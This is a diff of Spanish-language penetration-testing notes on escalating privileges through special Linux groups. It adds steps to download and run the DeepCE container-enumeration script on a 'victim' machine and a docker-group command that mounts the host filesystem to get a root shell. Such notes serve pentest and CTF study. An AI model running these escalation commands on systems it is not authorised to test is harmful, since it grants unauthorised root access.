@@ -14,7 +14,7 @@ Para mitigar el riesgo de abuso de grupos de usuario especiales, es importante l
 # Grupos Especiales 
 
 ```bash 
-❯ id       # Mirar grupos  
+❯ id   # Mirar grupos  
 ```
 
 ## Sudo
@@ -25,6 +25,27 @@ sudo = Si estas en estre grupo y disponemos de la passwd del usuario, podemos ej
 
 ## Docker
 
+### Forma 1
+
+DeepCE significa Docker Enumeration, Escalation of Privileges and Container Escapes. Está específicamente pensado para cuando ya tienes acceso a un contenedor Linux/Docker y quieres determinar si existe una vía para interactuar con el host o escapar del contenedor.
+
+* [Deepce](https://github.com/stealthcopter/deepce)
+
+```bash 
+❯ wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh 
+
+# Subir 'deepce.sh' a la máquina víctima y ejecutarlo
+❯ chmod +x deepce.sh 
+❯ ./deepce.sh   
+```
+#### Escalar a Root
+* [docker-group.md](https://stealthcopter.github.io/deepce/guides/docker-group.md)
+```bash 
+# Ejecutar el comando en la máquina víctima para ser root
+❯ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash   
+```
+
+### Forma 2
 ```bash 
 docker = Si estas en este grupo puedes usar los siguientes comandos:
 ❯ docker images                # Mirar las imagenes existentes 
